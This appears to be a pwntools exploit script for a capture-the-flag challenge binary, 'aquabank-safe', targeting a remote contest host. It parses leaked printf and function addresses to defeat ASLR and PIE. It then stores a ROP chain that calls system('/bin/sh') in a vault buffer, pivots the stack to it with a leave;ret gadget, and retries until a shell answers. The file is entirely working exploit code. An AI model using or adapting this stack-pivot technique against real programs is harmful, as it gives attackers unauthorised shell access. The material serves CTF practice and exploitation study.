#!/usr/bin/env python3

from pwn import *

context.binary = elf = ELF("./aquabank-safe", checksec=False)
context.arch = "amd64"

libc = ELF("./libc.so.6", checksec=False)

def conn():
    if args.LOCAL:
        r = process(elf.path)
            #pause()
    else: 
        r = remote('offsec.m0lecon.it',13564)
    return r

def main():
    while True:
        try:
            p = conn()

            p.sendlineafter(b"> ", b"1")
            p.recvuntil(b"[diag] printf @ ")
            printf_leak = int(p.recvline().strip(), 16)
            p.recvuntil(b"[diag] entry  @ ")
            diag_leak = int(p.recvline().strip(), 16)

            libc.address = printf_leak - libc.sym["printf"]
            pie_base = diag_leak - elf.sym["diagnostics"]
            vault = pie_base + elf.sym["vault"]
            leave_ret = pie_base + 0x1385
            ret = pie_base + 0x101a
            pop_rdi = libc.address + 0x10f78b
            system = libc.sym["system"]
            binsh = next(libc.search(b"/bin/sh"))

            PIVOT_OFF = 0x800
            pivot = vault + PIVOT_OFF

            chain = flat(0x0, ret, pop_rdi, binsh, system)
            deposit_payload = b"A" * PIVOT_OFF + chain

            p.sendlineafter(b"> ", b"2")
            p.sendlineafter(b"(bytes): ", str(len(deposit_payload)).encode())
            p.recvuntil(b":\n")
            p.send(deposit_payload)
            p.recvuntil(b"Deposit registered.")

            pivot_payload = flat(b"A" * 8, pivot, leave_ret)

            p.sendlineafter(b"> ", b"3")
            p.recvuntil(b"combination:", timeout=3)
            p.send(pivot_payload)

            p.sendline(b"id")
            resp = p.recvuntil(b"uid=", timeout=3)
            if b"uid=" in resp:
                log.success("Shell ottenuta!")
                p.interactive()
                break
            else:
                log.warning("Niente shell, riprovo...")
                p.close()

        except Exception as e:
            log.warning(f"Errore: {e}, riprovo...")
            try:
                p.close()
            except:
                pass

if __name__ == "__main__":
    main()